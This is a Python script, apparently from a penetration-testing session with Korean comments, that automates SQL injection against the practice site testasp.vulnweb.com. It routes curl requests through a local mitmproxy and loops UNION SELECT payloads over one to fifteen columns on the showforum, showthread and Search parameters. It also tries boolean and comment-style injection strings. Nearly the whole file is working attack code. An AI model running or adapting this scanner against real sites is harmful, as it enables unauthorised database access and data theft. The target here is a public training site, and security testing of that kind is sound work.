#!/usr/bin/env python3
"""Round 3 (계속-2) — UNION 컬럼 수 재탐색: 원 쿼리 잔여부를 주석으로 끊고 다시 시도."""
import subprocess, urllib.parse

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]


def code(url):
    p = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code} %{size_download}"]
                       + PROXY + ["-m", "25", url], capture_output=True, text=True)
    return p.stdout.strip()


def scan(name, base, templates):
    print(f"\n### {name}")
    for tpl_name, tpl in templates:
        for n in range(1, 16):
            cols = ",".join(str(i) for i in range(1, n + 1))
            pay = tpl.format(cols=cols)
            r = code(base + urllib.parse.quote(pay))
            if r.startswith("200"):
                print(f"  ✅ {tpl_name}: {r}  <-  cols={n}   payload={pay}")
                break
        else:
            print(f"  ❌ {tpl_name}: 1~15 전부 500")


scan("showforum.asp?id=",
     f"{BASE}/showforum.asp?id=",
     [("UNION SELECT ...--", "0 UNION SELECT {cols}--"),
      ("UNION ALL SELECT ...--", "0 UNION ALL SELECT {cols}--"),
      ("UNION SELECT .../*", "0 UNION SELECT {cols}/*")])

scan("showthread.asp?id=",
     f"{BASE}/showthread.asp?id=",
     [("-1 UNION SELECT {cols}--", "-1 UNION SELECT {cols}--"),
      ("0 UNION SELECT ...--", "0 UNION SELECT {cols}--")])

scan("Search.asp?tfSearch=",
     f"{BASE}/Search.asp?tfSearch=",
     [("zzz' UNION SELECT {cols}--", "zzz' UNION SELECT {cols}--"),
      ("' UNION SELECT {cols}--", "' UNION SELECT {cols}--")])

print("\n### 참고: 주석/연산자 동작 재확인 (showforum)")
f = f"{BASE}/showforum.asp?id="
for label, pay in [
    ("1 AND 1=1", "1 AND 1=1"),
    ("1 AND 1=2", "1 AND 1=2"),
    ("1; --", "1; --"),
    ("1) --", "1) --"),
    ("1 --", "1 --"),
    ("1/**/AND/**/1=1", "1/**/AND/**/1=1"),
    ("1 AND (SELECT 1)=1", "1 AND (SELECT 1)=1"),
    ("1 AND 1=1 --", "1 AND 1=1 --"),
]:
    print(f"  {label:26s} -> {code(f + urllib.parse.quote(pay))}")
